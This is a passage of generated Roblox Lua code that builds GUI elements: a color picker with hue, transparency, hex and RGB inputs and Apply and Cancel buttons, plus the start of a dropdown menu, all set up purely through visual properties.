G2L["2d2"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["2d2"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2d2"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["2d2"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2d2"]["BackgroundTransparency"] = 1;
G2L["2d2"]["Size"] = UDim2.new(1, 0, 0, 20);
G2L["2d2"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2d2"]["Text"] = [[--]];
G2L["2d2"]["LayoutOrder"] = 1;
G2L["2d2"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.text.text
G2L["2d3"] = Instance.new("UIStroke", G2L["2d2"]);
G2L["2d3"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.text.UIPadding
G2L["2d4"] = Instance.new("UIPadding", G2L["2d2"]);
G2L["2d4"]["PaddingLeft"] = UDim.new(0, 5);


-- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.UIListLayout
G2L["2d5"] = Instance.new("UIListLayout", G2L["2ce"]);
G2L["2d5"]["SortOrder"] = Enum.SortOrder.LayoutOrder;


-- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.canvashue
G2L["2d6"] = Instance.new("Frame", G2L["2ce"]);
G2L["2d6"]["BorderSizePixel"] = 0;
G2L["2d6"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2d6"]["Size"] = UDim2.new(1, 0, 0, 180);
G2L["2d6"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2d6"]["Name"] = [[canvashue]];
G2L["2d6"]["LayoutOrder"] = 2;
G2L["2d6"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.canvashue.canvasFrame
G2L["2d7"] = Instance.new("Frame", G2L["2d6"]);
G2L["2d7"]["BorderSizePixel"] = 0;
G2L["2d7"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2d7"]["Size"] = UDim2.new(1, -20, 1, 0);
G2L["2d7"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2d7"]["Name"] = [[canvasFrame]];
G2L["2d7"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.canvashue.canvasFrame.canvas
G2L["2d8"] = Instance.new("TextButton", G2L["2d7"]);
G2L["2d8"]["TextTransparency"] = 1;
G2L["2d8"]["TextSize"] = 14;
G2L["2d8"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2d8"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2d8"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["2d8"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["2d8"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
G2L["2d8"]["Name"] = [[canvas]];


-- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.canvashue.canvasFrame.canvas.dot
G2L["2d9"] = Instance.new("Frame", G2L["2d8"]);
G2L["2d9"]["ZIndex"] = 999999999;
G2L["2d9"]["BorderSizePixel"] = 0;
G2L["2d9"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2d9"]["Size"] = UDim2.new(0, 4, 0, 4);
G2L["2d9"]["Position"] = UDim2.new(0.5, 0, 0.5, 0);
G2L["2d9"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2d9"]["Name"] = [[dot]];


-- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.canvashue.canvasFrame.canvas.dot.UICorner
G2L["2da"] = Instance.new("UICorner", G2L["2d9"]);
G2L["2da"]["CornerRadius"] = UDim.new(0, 999);


-- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.canvashue.canvasFrame.canvas.dot.UIStroke
G2L["2db"] = Instance.new("UIStroke", G2L["2d9"]);



-- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.canvashue.canvasFrame.UIPadding
G2L["2dc"] = Instance.new("UIPadding", G2L["2d7"]);
G2L["2dc"]["PaddingTop"] = UDim.new(0, 3);
G2L["2dc"]["PaddingRight"] = UDim.new(0, 3);
G2L["2dc"]["PaddingLeft"] = UDim.new(0, 3);
G2L["2dc"]["PaddingBottom"] = UDim.new(0, 3);


-- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.canvashue.hueFrame
G2L["2dd"] = Instance.new("Frame", G2L["2d6"]);
G2L["2dd"]["BorderSizePixel"] = 0;
G2L["2dd"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2dd"]["Size"] = UDim2.new(0, 20, 1, 0);
G2L["2dd"]["Position"] = UDim2.new(1, -20, 0, 0);
G2L["2dd"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2dd"]["Name"] = [[hueFrame]];
G2L["2dd"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.canvashue.hueFrame.hue
G2L["2de"] = Instance.new("TextButton", G2L["2dd"]);
G2L["2de"]["TextTransparency"] = 1;
G2L["2de"]["TextSize"] = 14;
G2L["2de"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2de"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2de"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["2de"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["2de"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2de"]["Name"] = [[hue]];


-- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.canvashue.hueFrame.hue.line
G2L["2df"] = Instance.new("Frame", G2L["2de"]);
G2L["2df"]["ZIndex"] = 999999999;
G2L["2df"]["BorderSizePixel"] = 0;
G2L["2df"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2df"]["Size"] = UDim2.new(1, 0, 0, 1);
G2L["2df"]["Position"] = UDim2.new(0, 0, 0.5, 0);
G2L["2df"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2df"]["Name"] = [[line]];


-- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.canvashue.hueFrame.hue.line.UIStroke
G2L["2e0"] = Instance.new("UIStroke", G2L["2df"]);



-- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.canvashue.hueFrame.UIPadding
G2L["2e1"] = Instance.new("UIPadding", G2L["2dd"]);
G2L["2e1"]["PaddingTop"] = UDim.new(0, 3);
G2L["2e1"]["PaddingRight"] = UDim.new(0, 3);
G2L["2e1"]["PaddingLeft"] = UDim.new(0, 1);
G2L["2e1"]["PaddingBottom"] = UDim.new(0, 3);


-- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.transparency
G2L["2e2"] = Instance.new("Frame", G2L["2ce"]);
G2L["2e2"]["BorderSizePixel"] = 0;
G2L["2e2"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2e2"]["Size"] = UDim2.new(1, 0, 0, 18);
G2L["2e2"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2e2"]["Name"] = [[transparency]];
G2L["2e2"]["LayoutOrder"] = 3;
G2L["2e2"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.transparency.transparencyFrame
G2L["2e3"] = Instance.new("Frame", G2L["2e2"]);
G2L["2e3"]["BorderSizePixel"] = 0;
G2L["2e3"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2e3"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["2e3"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2e3"]["Name"] = [[transparencyFrame]];
G2L["2e3"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.transparency.transparencyFrame.slider
G2L["2e4"] = Instance.new("TextButton", G2L["2e3"]);
G2L["2e4"]["TextTransparency"] = 1;
G2L["2e4"]["TextSize"] = 14;
G2L["2e4"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2e4"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2e4"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["2e4"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["2e4"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2e4"]["Name"] = [[slider]];


-- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.transparency.transparencyFrame.slider.line
G2L["2e5"] = Instance.new("Frame", G2L["2e4"]);
G2L["2e5"]["ZIndex"] = 999999999;
G2L["2e5"]["BorderSizePixel"] = 0;
G2L["2e5"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2e5"]["Size"] = UDim2.new(0, 1, 1, 0);
G2L["2e5"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2e5"]["Name"] = [[line]];


-- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.transparency.transparencyFrame.slider.line.UIStroke
G2L["2e6"] = Instance.new("UIStroke", G2L["2e5"]);



-- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.transparency.transparencyFrame.UIPadding
G2L["2e7"] = Instance.new("UIPadding", G2L["2e3"]);
G2L["2e7"]["PaddingTop"] = UDim.new(0, 1);
G2L["2e7"]["PaddingRight"] = UDim.new(0, 3);
G2L["2e7"]["PaddingLeft"] = UDim.new(0, 3);
G2L["2e7"]["PaddingBottom"] = UDim.new(0, 1);


-- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.colorvalue
G2L["2e8"] = Instance.new("Frame", G2L["2ce"]);
G2L["2e8"]["BorderSizePixel"] = 0;
G2L["2e8"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2e8"]["Size"] = UDim2.new(1, 0, 0, 23);
G2L["2e8"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2e8"]["Name"] = [[colorvalue]];
G2L["2e8"]["LayoutOrder"] = 4;
G2L["2e8"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.colorvalue.hex
G2L["2e9"] = Instance.new("Frame", G2L["2e8"]);
G2L["2e9"]["BorderSizePixel"] = 0;
G2L["2e9"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2e9"]["Size"] = UDim2.new(1, -100, 1, 0);
G2L["2e9"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2e9"]["Name"] = [[hex]];
G2L["2e9"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.colorvalue.hex.UIPadding
G2L["2ea"] = Instance.new("UIPadding", G2L["2e9"]);
G2L["2ea"]["PaddingTop"] = UDim.new(0, 2);
G2L["2ea"]["PaddingRight"] = UDim.new(0, 3);
G2L["2ea"]["PaddingLeft"] = UDim.new(0, 3);
G2L["2ea"]["PaddingBottom"] = UDim.new(0, 2);


-- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.colorvalue.hex.textbox
G2L["2eb"] = Instance.new("TextBox", G2L["2e9"]);
G2L["2eb"]["Name"] = [[textbox]];
G2L["2eb"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["2eb"]["PlaceholderColor3"] = Color3.fromRGB(201, 201, 201);
G2L["2eb"]["TextSize"] = 14;
G2L["2eb"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2eb"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
G2L["2eb"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["2eb"]["BorderMode"] = Enum.BorderMode.Inset;
G2L["2eb"]["PlaceholderText"] = [[Hex color]];
G2L["2eb"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["2eb"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
G2L["2eb"]["Text"] = [[]];


-- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.colorvalue.hex.textbox.outlineStroke
G2L["2ec"] = Instance.new("UIStroke", G2L["2eb"]);
G2L["2ec"]["ZIndex"] = 10;
G2L["2ec"]["Thickness"] = 2;
G2L["2ec"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["2ec"]["Name"] = [[outlineStroke]];


-- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.colorvalue.hex.textbox.buttonFade
G2L["2ed"] = Instance.new("CanvasGroup", G2L["2eb"]);
G2L["2ed"]["BorderSizePixel"] = 0;
G2L["2ed"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2ed"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2ed"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["2ed"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2ed"]["Name"] = [[buttonFade]];


-- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.colorvalue.hex.textbox.buttonFade.UIGradient
G2L["2ee"] = Instance.new("UIGradient", G2L["2ed"]);
G2L["2ee"]["Rotation"] = 90;
G2L["2ee"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};


-- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.colorvalue.hex.textbox.text
G2L["2ef"] = Instance.new("UIStroke", G2L["2eb"]);
G2L["2ef"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.colorvalue.hex.textbox.UIPadding
G2L["2f0"] = Instance.new("UIPadding", G2L["2eb"]);
G2L["2f0"]["PaddingLeft"] = UDim.new(0, 6);


-- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.colorvalue.rgb
G2L["2f1"] = Instance.new("Frame", G2L["2e8"]);
G2L["2f1"]["BorderSizePixel"] = 0;
G2L["2f1"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2f1"]["Size"] = UDim2.new(1, -100, 1, 0);
G2L["2f1"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2f1"]["Name"] = [[rgb]];
G2L["2f1"]["LayoutOrder"] = 1;
G2L["2f1"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.colorvalue.rgb.UIPadding
G2L["2f2"] = Instance.new("UIPadding", G2L["2f1"]);
G2L["2f2"]["PaddingTop"] = UDim.new(0, 2);
G2L["2f2"]["PaddingRight"] = UDim.new(0, 3);
G2L["2f2"]["PaddingLeft"] = UDim.new(0, 3);
G2L["2f2"]["PaddingBottom"] = UDim.new(0, 2);


-- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.colorvalue.rgb.textbox
G2L["2f3"] = Instance.new("TextBox", G2L["2f1"]);
G2L["2f3"]["Name"] = [[textbox]];
G2L["2f3"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["2f3"]["PlaceholderColor3"] = Color3.fromRGB(201, 201, 201);
G2L["2f3"]["TextWrapped"] = true;
G2L["2f3"]["TextSize"] = 14;
G2L["2f3"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2f3"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
G2L["2f3"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["2f3"]["BorderMode"] = Enum.BorderMode.Inset;
G2L["2f3"]["PlaceholderText"] = [[RGB color]];
G2L["2f3"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["2f3"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
G2L["2f3"]["Text"] = [[]];


-- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.colorvalue.rgb.textbox.outlineStroke
G2L["2f4"] = Instance.new("UIStroke", G2L["2f3"]);
G2L["2f4"]["ZIndex"] = 10;
G2L["2f4"]["Thickness"] = 2;
G2L["2f4"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["2f4"]["Name"] = [[outlineStroke]];


-- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.colorvalue.rgb.textbox.buttonFade
G2L["2f5"] = Instance.new("CanvasGroup", G2L["2f3"]);
G2L["2f5"]["BorderSizePixel"] = 0;
G2L["2f5"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2f5"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2f5"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["2f5"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2f5"]["Name"] = [[buttonFade]];


-- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.colorvalue.rgb.textbox.buttonFade.UIGradient
G2L["2f6"] = Instance.new("UIGradient", G2L["2f5"]);
G2L["2f6"]["Rotation"] = 90;
G2L["2f6"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};


-- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.colorvalue.rgb.textbox.text
G2L["2f7"] = Instance.new("UIStroke", G2L["2f3"]);
G2L["2f7"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.colorvalue.rgb.textbox.UIPadding
G2L["2f8"] = Instance.new("UIPadding", G2L["2f3"]);
G2L["2f8"]["PaddingLeft"] = UDim.new(0, 6);


-- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.colorvalue.UIListLayout
G2L["2f9"] = Instance.new("UIListLayout", G2L["2e8"]);
G2L["2f9"]["SortOrder"] = Enum.SortOrder.LayoutOrder;
G2L["2f9"]["FillDirection"] = Enum.FillDirection.Horizontal;


-- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.applycancel
G2L["2fa"] = Instance.new("Frame", G2L["2ce"]);
G2L["2fa"]["BorderSizePixel"] = 0;
G2L["2fa"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2fa"]["Size"] = UDim2.new(1, 0, 0, 23);
G2L["2fa"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2fa"]["Name"] = [[applycancel]];
G2L["2fa"]["LayoutOrder"] = 5;
G2L["2fa"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.applycancel.UIListLayout
G2L["2fb"] = Instance.new("UIListLayout", G2L["2fa"]);
G2L["2fb"]["SortOrder"] = Enum.SortOrder.LayoutOrder;
G2L["2fb"]["FillDirection"] = Enum.FillDirection.Horizontal;


-- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.applycancel.apply
G2L["2fc"] = Instance.new("TextButton", G2L["2fa"]);
G2L["2fc"]["BorderSizePixel"] = 0;
G2L["2fc"]["TextTransparency"] = 1;
G2L["2fc"]["TextSize"] = 14;
G2L["2fc"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2fc"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2fc"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["2fc"]["BackgroundTransparency"] = 1;
G2L["2fc"]["Size"] = UDim2.new(0, 100, 1, 0);
G2L["2fc"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2fc"]["Name"] = [[apply]];


-- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.applycancel.apply.UIPadding
G2L["2fd"] = Instance.new("UIPadding", G2L["2fc"]);
G2L["2fd"]["PaddingTop"] = UDim.new(0, 2);
G2L["2fd"]["PaddingRight"] = UDim.new(0, 3);
G2L["2fd"]["PaddingLeft"] = UDim.new(0, 3);
G2L["2fd"]["PaddingBottom"] = UDim.new(0, 2);


-- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.applycancel.apply.buttonFrame
G2L["2fe"] = Instance.new("Frame", G2L["2fc"]);
G2L["2fe"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
G2L["2fe"]["BorderMode"] = Enum.BorderMode.Inset;
G2L["2fe"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["2fe"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
G2L["2fe"]["Name"] = [[buttonFrame]];


-- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.applycancel.apply.buttonFrame.outlineStroke
G2L["2ff"] = Instance.new("UIStroke", G2L["2fe"]);
G2L["2ff"]["ZIndex"] = 10;
G2L["2ff"]["Thickness"] = 2;
G2L["2ff"]["Name"] = [[outlineStroke]];


-- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.applycancel.apply.text
G2L["300"] = Instance.new("TextLabel", G2L["2fc"]);
G2L["300"]["ZIndex"] = 2;
G2L["300"]["BorderSizePixel"] = 0;
G2L["300"]["TextSize"] = 14;
G2L["300"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["300"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["300"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["300"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["300"]["BackgroundTransparency"] = 1;
G2L["300"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["300"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["300"]["Text"] = [[Apply]];
G2L["300"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.applycancel.apply.text.text
G2L["301"] = Instance.new("UIStroke", G2L["300"]);
G2L["301"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.applycancel.cancel
G2L["302"] = Instance.new("TextButton", G2L["2fa"]);
G2L["302"]["BorderSizePixel"] = 0;
G2L["302"]["TextTransparency"] = 1;
G2L["302"]["TextSize"] = 14;
G2L["302"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["302"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["302"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["302"]["BackgroundTransparency"] = 1;
G2L["302"]["Size"] = UDim2.new(0, 100, 1, 0);
G2L["302"]["LayoutOrder"] = 1;
G2L["302"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["302"]["Name"] = [[cancel]];


-- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.applycancel.cancel.UIPadding
G2L["303"] = Instance.new("UIPadding", G2L["302"]);
G2L["303"]["PaddingTop"] = UDim.new(0, 2);
G2L["303"]["PaddingRight"] = UDim.new(0, 3);
G2L["303"]["PaddingLeft"] = UDim.new(0, 3);
G2L["303"]["PaddingBottom"] = UDim.new(0, 2);


-- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.applycancel.cancel.buttonFrame
G2L["304"] = Instance.new("Frame", G2L["302"]);
G2L["304"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
G2L["304"]["BorderMode"] = Enum.BorderMode.Inset;
G2L["304"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["304"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
G2L["304"]["Name"] = [[buttonFrame]];


-- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.applycancel.cancel.buttonFrame.outlineStroke
G2L["305"] = Instance.new("UIStroke", G2L["304"]);
G2L["305"]["ZIndex"] = 10;
G2L["305"]["Thickness"] = 2;
G2L["305"]["Name"] = [[outlineStroke]];


-- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.applycancel.cancel.buttonFrame.buttonFade
G2L["306"] = Instance.new("CanvasGroup", G2L["304"]);
G2L["306"]["BorderSizePixel"] = 0;
G2L["306"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["306"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
G2L["306"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["306"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["306"]["Name"] = [[buttonFade]];


-- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.applycancel.cancel.buttonFrame.buttonFade.UIGradient
G2L["307"] = Instance.new("UIGradient", G2L["306"]);
G2L["307"]["Rotation"] = 90;
G2L["307"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};


-- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.applycancel.cancel.text
G2L["308"] = Instance.new("TextLabel", G2L["302"]);
G2L["308"]["ZIndex"] = 2;
G2L["308"]["BorderSizePixel"] = 0;
G2L["308"]["TextSize"] = 14;
G2L["308"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["308"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["308"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["308"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["308"]["BackgroundTransparency"] = 1;
G2L["308"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["308"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["308"]["Text"] = [[Cancel]];
G2L["308"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.applycancel.cancel.text.text
G2L["309"] = Instance.new("UIStroke", G2L["308"]);
G2L["309"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.ColorPicker.colorpickerFade
G2L["30a"] = Instance.new("CanvasGroup", G2L["2cc"]);
G2L["30a"]["BorderSizePixel"] = 0;
G2L["30a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["30a"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
G2L["30a"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["30a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["30a"]["Name"] = [[colorpickerFade]];


-- StarterGui.T5784YHRGE89ES98T.ColorPicker.colorpickerFade.UIGradient
G2L["30b"] = Instance.new("UIGradient", G2L["30a"]);
G2L["30b"]["Rotation"] = 90;
G2L["30b"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};


-- StarterGui.T5784YHRGE89ES98T.Dropdown
G2L["30c"] = Instance.new("Frame", G2L["1"]);
G2L["30c"]["Visible"] = false;
G2L["30c"]["ZIndex"] = 1000000010;
G2L["30c"]["BorderSizePixel"] = 0;
G2L["30c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["30c"]["Size"] = UDim2.new(0, 162, 0, 100);
G2L["30c"]["Position"] = UDim2.new(0.60349, 0, 0.36966, 0);
G2L["30c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["30c"]["Name"] = [[Dropdown]];
G2L["30c"]["BackgroundTransparency"] = 0.99;


-- StarterGui.T5784YHRGE89ES98T.Dropdown.UIListLayout
G2L["30d"] = Instance.new("UIListLayout", G2L["30c"]);
G2L["30d"]["SortOrder"] = Enum.SortOrder.LayoutOrder;


-- StarterGui.T5784YHRGE89ES98T.Dropdown.dropdownSelectAll
G2L["30e"] = Instance.new("Frame", G2L["30c"]);
G2L["30e"]["BorderSizePixel"] = 0;
G2L["30e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["30e"]["Size"] = UDim2.new(1, 0, 0, 20);
G2L["30e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["30e"]["Name"] = [[dropdownSelectAll]];
G2L["30e"]["LayoutOrder"] = 1;


-- StarterGui.T5784YHRGE89ES98T.Dropdown.dropdownSelectAll.selectall
G2L["30f"] = Instance.new("TextButton", G2L["30e"]);
G2L["30f"]["TextSize"] = 12;
G2L["30f"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["30f"]["BackgroundColor3"] = Color3.fromRGB(26, 26, 26);
G2L["30f"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["30f"]["Size"] = UDim2.new(0.5, 0, 1, 0);
G2L["30f"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
G2L["30f"]["Text"] = [[Select All]];
G2L["30f"]["Name"] = [[selectall]];


-- StarterGui.T5784YHRGE89ES98T.Dropdown.dropdownSelectAll.selectall.buttonFade
G2L["310"] = Instance.new("CanvasGroup", G2L["30f"]);
G2L["310"]["Visible"] = false;
G2L["310"]["BorderSizePixel"] = 0;
